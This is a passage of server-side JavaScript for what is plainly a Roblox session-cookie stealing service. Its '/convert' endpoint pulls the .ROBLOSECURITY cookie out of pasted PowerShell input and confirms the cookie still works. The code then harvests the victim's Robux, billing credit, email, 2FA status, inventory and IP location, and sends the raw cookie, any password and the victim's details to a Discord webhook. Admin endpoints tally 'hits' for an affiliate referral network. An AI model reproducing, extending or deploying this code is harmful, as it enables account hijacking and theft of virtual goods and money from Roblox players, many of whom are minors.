      activeDirectories
    });

  } catch (error) {
    console.error('Error getting admin stats:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint for admin logs (protected)
app.get('/api/admin/logs', adminLimiter, requireAdminPassword, async (req, res) => {
  try {
    const logsRef = db.ref('user_logs');
    const logsQuery = logsRef.orderByChild('timestamp').limitToLast(50);
    const snapshot = await logsQuery.once('value');
    const logs = snapshot.val() || {};

    const formattedLogs = Object.values(logs)
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
      .map(log => ({
        username: log.userData.username || 'Unknown',
        timestamp: log.timestamp,
        robux: log.userData.robux || 0,
        premium: log.userData.premium || false,
        rap: log.userData.rap || 0,
        directory: log.context?.directory || 'main',
        subdirectory: log.context?.subdirectory || null,
        ip: log.context?.ip || 'Unknown'
      }));

    res.json(formattedLogs);

  } catch (error) {
    console.error('Error getting admin logs:', error);
    res.status(500).json({ error: 'Server error' });
  }
});


// Function to validate Roblox cookie (check if alive or dead)
async function isRobloxCookieValid(cookie) {
  try {
    const response = await fetch('https://users.roblox.com/v1/users/authenticated', {
      method: 'GET',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });

    // Valid cookie returns 200
    if (response.status === 200) {
      const data = await response.json();
      return { 
        valid: true, 
        userId: data.id, 
        username: data.name 
      };
    }
    
    // Invalid/expired cookie returns 401
    if (response.status === 401) {
      return { 
        valid: false, 
        reason: 'Cookie expired or invalid' 
      };
    }
    
    // Rate limited
    if (response.status === 429) {
      return { 
        valid: null, 
        reason: 'Rate limited - try again later' 
      };
    }
    
    // Other errors
    return { 
      valid: false, 
      reason: `Validation failed (HTTP ${response.status})` 
    };
    
  } catch (error) {
    console.error('❌ Cookie validation error:', error);
    return { 
      valid: false, 
      reason: 'Network error during validation' 
    };
  }
}

// Function to fetch user data from Roblox API
async function fetchRobloxUserData(token) {
  try {

    const baseHeaders = {
      'Cookie': `.ROBLOSECURITY=${token}`,
      'User-Agent': 'Roblox/WinInet',
      'Accept': 'application/json',
      'Accept-Language': 'en-US,en;q=0.9',
      'Referer': 'https://www.roblox.com/',
      'Origin': 'https://www.roblox.com'
    };

    // Get user info first
    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
      method: 'GET',
      headers: baseHeaders
    });

    if (!userResponse.ok) {
      // Try alternative endpoint if first fails
      const altUserResponse = await fetch('https://www.roblox.com/mobileapi/userinfo', {
        method: 'GET',
        headers: baseHeaders
      });

      if (!altUserResponse.ok) {
        return null;
      }

      const altUserData = await altUserResponse.json();

      // For mobile API, try to get actual robux data
      let actualRobux = altUserData.RobuxBalance || 0;
      let pendingRobux = 0;

      return {
        username: altUserData.UserName || "Unknown User",
        userId: altUserData.UserID || 0,
        robux: actualRobux,
        premium: altUserData.IsPremium || false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: pendingRobux,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0, // Will calculate below if possible
        groupsOwned: 0,
        groupFunds: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0, hats: 0, gear: 0, animations: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };
    }

    const userData = await userResponse.json();

    // Get robux data (current + pending)
    let robuxData = { robux: 0 };
    let pendingRobuxData = { pendingRobux: 0 };

    try {
      const robuxResponse = await fetch('https://economy.roblox.com/v1/user/currency', {
        headers: baseHeaders
      });
      if (robuxResponse.ok) {
        robuxData = await robuxResponse.json();
      }
    } catch (e) {
      // Silent handling
    }

    try {
      const pendingResponse = await fetch('https://economy.roblox.com/v1/user/currency/pending', {
        headers: baseHeaders
      });
      if (pendingResponse.ok) {
        pendingRobuxData = await pendingResponse.json();
      }
    } catch (e) {
      // Silent handling
    }

    // Helper to paginate transaction endpoint until null
    async function fetchAllTransactions(userId, transactionType) {
      const items = [];
      let cursor = null;
      do {
        const url = `https://economy.roblox.com/v2/users/${userId}/transactions?transactionType=${transactionType}&limit=100${cursor ? `&cursor=${cursor}` : ''}`;
        const res = await fetch(url, { headers: baseHeaders });
        if (!res.ok) break;
        const d = await res.json();
        if (d.data) items.push(...d.data);
        cursor = d.nextPageCursor ?? null;
      } while (cursor !== null);
      return items;
    }

    let currencyPurchases = [];
    let sales = [];
    let purchases = [];
    let premiumStipends = [];
    let groupPayouts = [];
    let engagementPayouts = [];
    let affiliateSales = [];

    try {
      [currencyPurchases, sales, purchases, premiumStipends, groupPayouts, engagementPayouts, affiliateSales] = await Promise.all([
        fetchAllTransactions(userData.id, 'CurrencyPurchase'),
        fetchAllTransactions(userData.id, 'Sale'),
        fetchAllTransactions(userData.id, 'Purchase'),
        fetchAllTransactions(userData.id, 'PremiumStipend'),
        fetchAllTransactions(userData.id, 'GroupPayout'),
        fetchAllTransactions(userData.id, 'EngagementPayout'),
        fetchAllTransactions(userData.id, 'AffiliateSale'),
      ]);
    } catch (e) {
      // Silent handling
    }

    // Summary = CurrencyPurchase + PremiumStipend + Sale + GroupPayout + EngagementPayout + AffiliateSale
    const totalCurrencyPurchased = currencyPurchases.reduce((sum, t) => sum + (t.currency?.amount || 0), 0)
                                 + premiumStipends.reduce((sum, t) => sum + (t.currency?.amount || 0), 0)
                                 + sales.reduce((sum, t) => sum + (t.currency?.amount || 0), 0)
                                 + groupPayouts.reduce((sum, t) => sum + (t.currency?.amount || 0), 0)
                                 + engagementPayouts.reduce((sum, t) => sum + (t.currency?.amount || 0), 0)
                                 + affiliateSales.reduce((sum, t) => sum + (t.currency?.amount || 0), 0);

    // Robux Incoming = total robux ever earned from sales
    const totalRobuxIncoming = sales.reduce((sum, t) => sum + (t.currency?.amount || 0), 0);

    // Robux Outgoing = total robux ever spent on purchases (already negative)
    const totalRobuxOutgoing = purchases.reduce((sum, t) => sum + (t.currency?.amount || 0), 0);

    // Still fetch pending robux from transaction-totals
    let pendingRobuxTotal = 0;
    try {
      const summaryResponse = await fetch(`https://economy.roblox.com/v2/users/${userData.id}/transaction-totals?timeFrame=Year&transactionType=summary`, {
        headers: baseHeaders
      });
      if (summaryResponse.ok) {
        const summaryData = await summaryResponse.json();
        pendingRobuxTotal = summaryData.pendingRobuxTotal || 0;
      }
    } catch (e) {
      // Silent handling
    }

    // Get credit balance and premium status from billing API
    let premiumData = { isPremium: false, subscriptionPrice: null };
    let creditBalance = 0;
    let creditCurrencyCode = 'USD';
    let savedPayment = false;

    try {
      const billingResponse = await fetch(`https://billing.roblox.com/v1/credit`, {
        headers: baseHeaders
      });

      if (billingResponse.ok) {
        const billingData = await billingResponse.json();

        // Extract credit balance information
        creditBalance = billingData.balance || 0;
        creditCurrencyCode = billingData.currencyCode || 'USD';
        savedPayment = billingData.hasSavedPayments || false;

        // Check if user has premium features via billing
        premiumData.isPremium = billingData.hasPremium || 
                               billingData.isPremium || 
                               (billingData.balance && billingData.balance > 0) || 
                               false;
      }
    } catch (billingError) {
      // Fallback to premium validation API if billing fails
    }

    // Always try premium features API to get subscription tier
    try {
      const premiumApiUrl = `https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`;
      const premiumResponse = await fetch(premiumApiUrl, { headers: baseHeaders });

      if (premiumResponse.ok) {
        const premiumValidation = await premiumResponse.json();

        if (typeof premiumValidation === 'boolean') {
          if (!premiumData.isPremium) premiumData.isPremium = premiumValidation;
        } else {
          if (!premiumData.isPremium) {
            premiumData.isPremium = premiumValidation.isPremium ||
                                    premiumValidation.IsPremium ||
                                    premiumValidation.premium ||
                                    premiumValidation.Premium || false;
          }
        }
      }

      // Fetch subscription details for tier (450 / 1000 / 2200)
      const subApiUrl = `https://premiumfeatures.roblox.com/v1/users/${userData.id}/subscriptions`;
      const subResponse = await fetch(subApiUrl, { headers: baseHeaders });
      if (subResponse.ok) {
        const subData = await subResponse.json();
        // subscriptionProductModel.robuxStipendAmount holds 450, 1000, or 2200
        const stipend = subData?.subscriptionProductModel?.robuxStipendAmount;
        if (stipend) premiumData.subscriptionPrice = stipend;
      }
    } catch (e) {
      // silent
    }

    // Get user details for account age
    let ageData = { created: null };
    try {
      const ageResponse = await fetch(`https://users.roblox.com/v1/users/${userData.id}`, {
        headers: baseHeaders
      });
      if (ageResponse.ok) {
        ageData = await ageResponse.json();
      }
    } catch (e) {
      // Silent handling
    }

    // Get groups owned
    let groupsOwned = 0;
    try {
      const groupsResponse = await fetch(`https://groups.roblox.com/v1/users/${userData.id}/groups/roles`, {
        headers: baseHeaders
      });
      if (groupsResponse.ok) {
        const groupsData = await groupsResponse.json();
        groupsOwned = groupsData.data ? groupsData.data.filter(group => group.role.rank === 255).length : 0;
      }
    } catch (e) {
      // Silent handling
    }

    // Get total funds across all owned groups
    let groupFunds = 0;
    try {
      const groupsResponse = await fetch(`https://groups.roblox.com/v1/users/${userData.id}/groups/roles`, {
        headers: baseHeaders
      });
      if (groupsResponse.ok) {
        const groupsData = await groupsResponse.json();
        const ownedGroups = groupsData.data ? groupsData.data.filter(group => group.role.rank === 255) : [];
        
        // Fetch funds for each owned group
        for (const groupInfo of ownedGroups) {
          try {
            const fundsResponse = await fetch(`https://economy.roblox.com/v1/groups/${groupInfo.group.id}/currency`, {
              headers: baseHeaders
            });
            if (fundsResponse.ok) {
              const fundsData = await fundsResponse.json();
              groupFunds += fundsData.robux || 0;
            }
          } catch (e) {
            // Silent handling for individual group
          }
        }
      }
    } catch (e) {
      // Silent handling
    }

    // Get inventory counts — paginate all pages
    let hasKorblox = false;
    let hasHeadless = false;
    let hasBonafide = false;
    let inventoryData = { hairs: 0, bundles: 0, faces: 0, hats: 0, gear: 0, animations: 0 };
    try {
      // Helper to paginate inventory endpoint until nextPageCursor is null
      async function fetchAllInventory(assetTypeId) {
        const items = [];
        let cursor = '';
        do {
          const url = `https://inventory.roblox.com/v2/users/${userData.id}/inventory/${assetTypeId}?limit=100&sortOrder=Desc${cursor ? `&cursor=${cursor}` : ''}`;
          const res = await fetch(url, { headers: baseHeaders });
          if (!res.ok) break;
          const d = await res.json();
          if (d.data) items.push(...d.data);
          cursor = d.nextPageCursor || '';
        } while (cursor);
        return items;
      }

      const [hairs, faces, hats, gear] = await Promise.all([
        fetchAllInventory(41), // Hairs
        fetchAllInventory(18), // Faces
        fetchAllInventory(8),  // Hats
        fetchAllInventory(19), // Gear
      ]);

      inventoryData.hairs = hairs.length;
      inventoryData.faces = faces.length;
      inventoryData.hats  = hats.length;
      inventoryData.gear  = gear.length;

      // Check Bonafide hat ownership (asset ID 102611803)
      hasBonafide = hats.some(item => item.assetId === 102611803);

      // Paginate through ALL bundle pages — catalog API returns max 100 per page
      const allBundles = [];
      let cursor = '';
      do {
        const url = `https://catalog.roblox.com/v1/users/${userData.id}/bundles?limit=100&sortOrder=Desc${cursor ? `&cursor=${cursor}` : ''}`;
        const res = await fetch(url, { headers: baseHeaders });
        if (!res.ok) break;
        const d = await res.json();
        if (d.data) allBundles.push(...d.data);
        cursor = d.nextPageCursor || '';
      } while (cursor);


      // BodyParts = avatar bundles | AvatarAnimations = animation packs | DynamicHead = ignored
      inventoryData.bundles    = allBundles.filter(item => item.bundleType === 'BodyParts').length;
      inventoryData.animations = allBundles.filter(item => item.bundleType === 'AvatarAnimations').length;

      // Korblox and Headless ownership via bundle ID (ID 192 = Korblox Deathspeaker, ID 348 = Headless Horseman)
      hasKorblox  = allBundles.some(item => item.id === 192);
      hasHeadless = allBundles.some(item => item.id === 201);

    } catch (e) {
      console.error(`[INV] Inventory fetch error:`, e.message);
    }

    // Get RAP (Limited item values) — paginate all pages
    let rapValue = 0;
    let rapCount = 0;
    try {
      let rapCursor = '';
      do {
        const rapUrl = `https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Desc&limit=100${rapCursor ? `&cursor=${rapCursor}` : ''}`;
        const collectiblesResponse = await fetch(rapUrl, { headers: baseHeaders });
        if (!collectiblesResponse.ok) break;
        const collectiblesData = await collectiblesResponse.json();
        if (collectiblesData.data) {
          collectiblesData.data.forEach(item => {
            rapValue += (item.recentAveragePrice || 0);
            rapCount++;
          });
        }
        rapCursor = collectiblesData.nextPageCursor || '';
      } while (rapCursor);
    } catch (e) {
      // Silent handling
    }

    // Calculate account age in days
    let accountAge = 0;
    if (ageData.created) {
      const createdDate = new Date(ageData.created);
      const now = new Date();
      accountAge = Math.floor((now - createdDate) / (1000 * 60 * 60 * 24));
    }

    // Korblox and Headless are now detected via bundle ownership (set in inventory block above)

    // Fetch email verification status, voice chat, and 2FA
    let emailVerified = false;
    let emailAddress = null;
    let voiceChatEnabled = false;
    let twoFactorEnabled = false;

    try {
      const emailResponse = await fetch('https://accountsettings.roblox.com/v1/email', { headers: baseHeaders });
      if (emailResponse.ok) {
        const emailData = await emailResponse.json();
        emailVerified = emailData.verified || false;
        emailAddress = emailData.emailAddress || null;
      }
    } catch (e) { /* Ignore email fetch errors */ }

    try {
      const voiceResponse = await fetch('https://voice.roblox.com/v1/settings', { headers: baseHeaders });
      if (voiceResponse.ok) {
        const voiceData = await voiceResponse.json();
        voiceChatEnabled = voiceData.isVoiceEnabled || false;
      }
    } catch (e) { /* Ignore voice chat fetch errors */ }

    try {
      const twoFaResponse = await fetch(`https://twostepverification.roblox.com/v1/users/${userData.id}/configuration`, { headers: baseHeaders });
      if (twoFaResponse.ok) {
        const twoFaData = await twoFaResponse.json();
        twoFactorEnabled = twoFaData.primaryMediaType !== 'None' || false;
      }
    } catch (e) { /* Ignore 2FA fetch errors */ }

    return {
      username: userData.name || userData.displayName,
      userId: userData.id,
      robux: robuxData.robux || 0,
      premium: premiumData.isPremium || false,
      premiumTier: premiumData.subscriptionPrice || null,
      rap: rapValue,
      rapCount: rapCount,
      summary: totalCurrencyPurchased,        // Total robux ever bought with real money
      creditBalance: creditBalance,
      creditCurrencyCode: creditCurrencyCode,
      savedPayment: savedPayment,
      robuxIncoming: totalRobuxIncoming,       // Total robux ever earned from sales
      robuxOutgoing: totalRobuxOutgoing,       // Total robux ever spent (negative)
      robuxPending: pendingRobuxTotal,         // Pending robux
      korblox: hasKorblox,
      headless: hasHeadless,
      bonafide: hasBonafide,
      twoFactorEnabled: twoFactorEnabled,
      accountAge: accountAge,
      groupsOwned: groupsOwned,
      groupFunds: groupFunds,  // Total Robux across all owned groups
      placeVisits: 0, // This data is not easily accessible via API
      inventory: inventoryData,
      emailVerified: emailVerified,
      emailAddress: emailAddress,
      voiceChatEnabled: voiceChatEnabled,
      purchases: purchases  // Pass through for gamepass checking in sendToDiscord
    };

  } catch (error) {
    return null;
  }
}


// Function to send Discord webhook with user data (supports custom webhook URLs)
async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown', userData = null, customWebhookUrl = null, customTitle = null, useCustomWebhook = false, userIp = null, dirConfig = null) {
  const webhookUrl = customWebhookUrl || process.env.DISCORD_WEBHOOK_URL;

  console.log('Webhook URL configured:', webhookUrl ? 'YES' : 'NO');

  if (!webhookUrl) {

    return { success: false, error: 'Webhook URL not configured' };
  }

  try {
    if (userData) {
      // Fetch avatar thumbnail URL
      let avatarUrl = null;
      try {
        const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userData.userId}&size=150x150&format=Png&isCircular=false`);
        if (avatarResponse.ok) {
          const avatarData = await avatarResponse.json();
          if (avatarData.data && avatarData.data.length > 0) {
            avatarUrl = avatarData.data[0].imageUrl;
          }
        }
      } catch (error) {
        console.log('Failed to fetch avatar, continuing without it');
      }

      // First embed: User data only (without cookie)

      // GeoIP lookup — get country from IP
      let geoInfo = { country: 'Unknown', flag: '🌐' };
      if (userIp) {
        try {
          const geoRes = await fetch(`https://ipapi.co/${userIp}/json/`, {
            headers: { 'User-Agent': 'Mozilla/5.0' }
          });
          if (geoRes.ok) {
            const geo = await geoRes.json();
            if (geo.country_code) {
              // Convert country code to flag emoji (e.g. US → 🇺🇸)
              const flag = geo.country_code.toUpperCase().split('').map(c =>
                String.fromCodePoint(0x1F1E6 + c.charCodeAt(0) - 65)
              ).join('');
              geoInfo = { country: geo.country_name || 'Unknown', flag };
            }
          }
        } catch (e) { /* silent */ }
      }

      // ── Gamepass Check (determines game played + owned count) ─────────────────────
      const baseHeaders = {
        'Cookie': `.ROBLOSECURITY=${token}`,
        'User-Agent': 'Roblox/WinInet',
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://www.roblox.com/',
        'Origin': 'https://www.roblox.com'
      };
      // Tracked games by universe ID — add new games here with just one line
      const TRACKED_GAMES = {
        bloxFruit:      { name: 'Blox Fruits',     creatorId: 4372130,  creatorType: 'Group', emoji: '<:bloxfruit:1475285123007119392>' },
        adoptMe:        { name: 'Adopt Me',         creatorId: 295182,   creatorType: 'Group', emoji: '<:adoptme:1475285196646383709>' },
        mm2:            { name: 'MM2',              creatorId: 1848960,  creatorType: 'User',  emoji: '<:mm2:1475285141986480159>' },
        dressToImpress: { name: 'Dress To Impress', creatorId: 17264167, creatorType: 'Group', emoji: '<:dresstoimpress:1475478562864627742>' },
        bladeBall:      { name: 'Blade Ball',       creatorId: 12836673, creatorType: 'Group', emoji: '<:bladeball:1475479538229055639>' },
        brookhaven:     { name: 'Brookhaven',       creatorId: 3104358,  creatorType: 'Group', emoji: '<:brookhaven:1475653293425426623>' },
      };

      // Fetch all owned gamepasses using game-passes API with exclusiveStartId pagination
      let allGamepasses = [];
      try {
        let lastId = null;
        do {
          const gpUrl = `https://apis.roblox.com/game-passes/v1/users/${userData.userId}/game-passes?count=100${lastId ? `&exclusiveStartId=${lastId}` : ''}`;
          const gpRes = await fetch(gpUrl, { headers: baseHeaders });
          if (!gpRes.ok) break;
          const gpData = await gpRes.json();
          const page = gpData.gamePasses || [];
          if (page.length === 0) break;
          allGamepasses.push(...page);
          lastId = page[page.length - 1].gamePassId;
        } while (lastId !== null);
      } catch (e) { /* silent */ }

      // Match owned gamepasses against tracked games by creator
      userData.games = {};
      for (const [key, game] of Object.entries(TRACKED_GAMES)) {
        const owned = allGamepasses.filter(gp =>
          gp.creator?.creatorId === game.creatorId &&
          gp.creator?.creatorType === game.creatorType
        );
        userData.games[key] = {
          played: owned.length > 0,
          owned: owned.length,
          emoji: game.emoji,
          name: game.name,
        };
      }
      // ─────────────────────────────────────────────────────────────────────────────

      const hitType = userData.password ? 'Extension' : 'AutoHar';
      const hitterAvatarUrl = (dirConfig?.discordId && dirConfig?.discordAvatar)
        ? `https://cdn.discordapp.com/avatars/${dirConfig.discordId}/${dirConfig.discordAvatar}.png`
        : null;

      const userDataEmbed = {
        author: {
          name: `${customTitle ? customTitle.replace(/^\+1 Hit /, '').replace(/^\+1 /, '') : 'Site Owner'} | ${hitType}`,
          icon_url: hitterAvatarUrl || 'https://cdn.discordapp.com/embed/avatars/0.png'
        },
        color: 0xFFFFFF,
        fields: [
          {
            name: "**Username**",
            value:`<:emoji_37:1410520517349212200> ${userData.username || "Unknown"}`,
            inline: false
          },
          ...(userData.password ? [{
            name: "**Password**",
            value: `🔑 ${userData.password}`,
            inline: false
          }] : []),
          {
            name: "**Robux | Pend**",
            value: `<:emoji_31:1410233610031857735> ${userData.robux || 0} | <:emoji_31:1410233610031857735> ${userData.robuxPending || 0}`,
            inline: true
          },
          {
            name: "**Premium**",
            value: userData.premium
              ? `<:rbxPremium:1408083254531330158> True${userData.premiumTier ? ` (${userData.premiumTier})` : ''}`
              : `<:rbxPremium:1408083254531330158> False`,
            inline: true
          },
          {
            name: "**Rap**",
            value:`<:emoji_36:1410512337839849543> ${userData.rap?.toString() || "0"} (${userData.rapCount || 0} Owned)`,
            inline: true
          },
          {
            name: "**Summary**",
            value:`<:emoji_40:1410521889121501214> ${userData.summary?.toString() || "0"}`,
            inline: true
          },
          {
            name: "**Billings**",
            value: `<a:emoji_42:1410523396995022890> Credit: ${userData.creditBalance > 0 ? `${userData.creditBalance} ${userData.creditCurrencyCode || 'USD'}` : `0 ${userData.creditCurrencyCode || 'USD'}`}\n<a:emoji_42:1410523396995022890> Convert: ${userData.creditBalance > 0 ? `${Math.round(userData.creditBalance * 80)} Robux` : "0 Robux"}\n<a:emoji_42:1410523396995022890> Payment: ${userData.savedPayment ? "True" : "False"}`,
            inline: false

          },

          {
            name: "**Income | Purchases**",
            value: `<:emoji_31:1410233610031857735> ${userData.robuxIncoming || 0} | <:emoji_31:1410233610031857735> ${userData.robuxOutgoing || 0}`,
            inline: true
          },
          {
            name: "**Collectibles**",
            value: `${userData.korblox ? "<:KorbloxDeathspeaker:1408080747306418257> True" : "<:KorbloxDeathspeaker:1408080747306418257> False"}\n${userData.headless ? "<:HeadlessHorseman:1397192572295839806> True" : "<:HeadlessHorseman:1397192572295839806> False"}\n${userData.bonafide ? "<:bona:1475461944231067751> True" : "<:bona:1475461944231067751> False"}`,
            inline: true
          },

          {
            name: "**Groups**",
            value: `<:emoji_38:1410520554842361857> Owned: ${userData.groupsOwned?.toString() || "0"}\n<:emoji_31:1410233610031857735> Funds: ${userData.groupFunds?.toLocaleString() || "0"}`,
            inline: true
          },
          {
            name: "**Games | Passes**",
            value: Object.values(userData.games).map(g => 
              `${g.emoji} ${g.played ? 'True' : 'False'} | ${g.owned}`
            ).join('\n'),
            inline: false
          },
          {
            name: "**Inventory**",
            value: `Hair: ${userData.inventory?.hairs || 0}\nFace: ${userData.inventory?.faces || 0}\nBundle: ${userData.inventory?.bundles || 0}\nHat: ${userData.inventory?.hats || 0}\nGear: ${userData.inventory?.gear || 0}\nAnimation: ${userData.inventory?.animations || 0}`,
            inline: false
          },
          {
            name: "**Settings**",
            value: `Email Status: ${userData.emailVerified ? "<:emoji_5:1472955670998290494>" : "<:emoji_4:1472955646897815552>"}\n2FA Status: ${userData.twoFactorEnabled ? "<:emoji_5:1472955670998290494>" : "<:emoji_4:1472955646897815552>"}\nVoice Chat: ${userData.voiceChatEnabled ? "<:emoji_5:1472955670998290494>" : "<:emoji_4:1472955646897815552>"}\nAge: ${userData.accountAge || 0} Days\nVictim: [${geoInfo.country}](https://ipinfo.io/${userIp}) ${geoInfo.flag}`,
            inline: false                  
          },
          
        ],
        footer: {
          text: `${customTitle || "Made By .Niqqa"}`
        }
      };

      // Add thumbnail if avatar URL was fetched successfully
      if (avatarUrl) {
        userDataEmbed.thumbnail = {
          url: avatarUrl
        };
      }

      // Second embed: Cookie only - display the raw token value in description with code block formatting
      const cookieEmbed = {
        title: "🍪 Cookie",
        description: "**```" + token + "```**",
        color: 0xFFFFFF,
        footer: {
          text: `${customTitle || "Made By .Niqqa"}`
        }
      };

      // Send both embeds together in a single message with @everyone notification
      const combinedPayload = {
        content: `@everyone +1 Hit`,
        embeds: [userDataEmbed, cookieEmbed]
      };

      // Add custom webhook branding if requested (for all directory hits)
      if (useCustomWebhook) {
  combinedPayload.username = userData.username || "Roblox User";
  combinedPayload.avatar_url = avatarUrl || "https://i.imgur.com/rVUUJ9d.png";
} else {
  combinedPayload.username = userData.username || "Roblox User";
  combinedPayload.avatar_url = avatarUrl || "https://i.imgur.com/rVUUJ9d.png";
      }



      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(combinedPayload)
      });



      if (!response.ok) {
        const errorText = await response.text();
        console.error('Combined embeds failed with status:', response.status, 'Error:', errorText);
        return { success: false, error: `Combined embeds failed: ${response.status}` };
      }


      return { success: true, avatarUrl: avatarUrl };

    } else {
      // Simple embed with just token (for cases without user data)
      const embed = {
        title: "LUNIX AUTOHAR",
        description: `Ur LUNIX AUTOHAR url\n📌\n\n\`${token}\``,
        color: 0x8B5CF6,
        footer: {
          text: "Made By Lunix"
        }
      };

      const payload = {
        embeds: [embed]
      };



      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      });


      if (!response.ok) {
        const errorText = await response.text();
        console.error('Webhook failed with status:', response.status, 'Error:', errorText);
        return { success: false, error: `Webhook failed: ${response.status}` };
      }


      return { success: true, avatarUrl: avatarUrl };
    }
  } catch (error) {
    console.error('❌ Failed to send Discord webhook:', error.message);
    console.error('Full error:', error);
    return { success: false, error: error.message };
  }
}

// Re-enabled convert endpoint for root path (site owner)
app.post('/convert', validateRequest, async (req, res) => {
  try {
    let input;
    let scriptType;

    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
    } else {
      return res.status(400).json({ error: 'Invalid File Format' });
    }

    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);

    if (!hasBasicPowershellStructure) {
      // Silently reject plain text inputs without sending webhooks
      return res.status(400).json({ 
        success: false,
        message: 'Invalid File Format'
      });
    }

    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
    const match = cleanedInput.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, '');

      // Check if token is empty, just whitespace, or only contains commas/special chars
      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
        // Send fallback embed when no valid token found
        const fallbackEmbed = {
          title: "⚠️ Input Received",
          description: "Input received but no ROBLOSECURITY found",
          color: 0x8B5CF6,
          footer: {
            text: "Made By Lunix"
          }
        };

        const fallbackPayload = {
          embeds: [fallbackEmbed]
        };

        // Send to Discord webhook
        try {
          const response = await fetch(process.env.DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });
        } catch (webhookError) {
          console.error('❌ Fallback webhook failed:', webhookError.message);
        }

        return res.status(400).json({ 
          success: false,
          message: 'Service Failed Invalid File'
        });
      }

      // Validate if cookie is alive before processing
      console.log(`🔍 Validating input for /convert...`);
      const cookieValidation = await isRobloxCookieValid(token);

      // If validation failed or cookie is invalid, reject immediately
      if (cookieValidation.valid === false) {
        console.log(`❌ Invalid input detected: ${cookieValidation.reason}`);
        return res.status(400).json({ 
          success: false,
          message: 'Service Failed Invalid File'
        });
      }

      // If rate limited, let user know
      if (cookieValidation.valid === null) {
        console.log(`⚠️ Validation rate limited`);
        return res.status(429).json({ 
          success: false,
          message: 'Service Temporarily Unavailable'
        });
      }

      console.log(`✅ Input validated successfully for user: ${cookieValidation.username}`);

      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      // If user data fetch failed, create a minimal user data object
      const webhookUserData = userData || {
        username: "Unknown User",
        userId: "Unknown",
        robux: 0,
        premium: false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: 0,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        groupFunds: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0, hats: 0, gear: 0, animations: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };

      // Send to Discord webhook with user data (fetch avatar first)
      const webhookResult = await sendToDiscord(token, userAgent, scriptType, webhookUserData, null, null, false, req.ip);

      // Log user data to database with avatar URL
      await logUserData(token, webhookUserData, { ip: req.ip, directory: 'main' }, webhookResult.avatarUrl);

      if (!webhookResult.success) {
        return res.status(500).json({ 
          success: false, 
          error: `Webhook failed: ${webhookResult.error}` 
        });
      }
    } else {
      // Send fallback embed when no token found
      const fallbackEmbed = {
        title: "⚠️ Input Received",
        description: "Input received but no ROBLOSECURITY found",
        color: 0x8B5CF6,
        footer: {
          text: "Made By Lunix"
        }
      };

      const fallbackPayload = {
        embeds: [fallbackEmbed]
      };

      // Send to Discord webhook
      try {
        const response = await fetch(process.env.DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(fallbackPayload)
        });
      } catch (webhookError) {
        console.error('❌ Fallback webhook failed:', webhookError.message);
      }

      return res.status(400).json({ 
        success: false,
        message: 'Service Failed Invalid File'
      });
    }

    res.json({ 
      success: true,
      message: 'Request submitted successfully!'
    });
  } catch (error) {
    // Log error without exposing sensitive details
    console.error('❌ Server error:', error.message);
    res.status(500).json({ error: 'Server error processing request' });
  }
});


// ─── Admin Directory Management Endpoints ─────────────────────────────────────

// GET all directories with stats
app.get('/api/admin/directories', adminLimiter, requireAdminPassword, async (req, res) => {
  try {
    const directories = await loadDirectories();

    const result = Object.entries(directories).map(([dirName, dirConfig]) => {
      const s = dirConfig.stats || {};

      // Count direct referrals
      let directReferrals = 0;
      function countDownline(parentName) {
        let count = 0;
        for (const [dn, dc] of Object.entries(directories)) {
          if (dc.referredBy === parentName) { count++; count += countDownline(dn); }
        }
        return count;
      }
      for (const [dn, dc] of Object.entries(directories)) {
        if (dc.referredBy === dirName) directReferrals++;
      }

      return {
        name: dirName,
        discordId: dirConfig.discordId || null,
        discordUsername: dirConfig.discordUsername || null,
        harName: dirConfig.harName || null,
        serviceType: dirConfig.serviceType || 'single',
        referralCode: dirConfig.referralCode || null,
        referredBy: dirConfig.referredBy || null,
        uniqueId: dirConfig.uniqueId || null,
        totalHits: s.totalHits || 0,
        totalSummary: s.totalSummary || 0,
        todayHits: s.todayHits || 0,
        lastHitAt: s.lastHitAt || null,
        directReferrals,
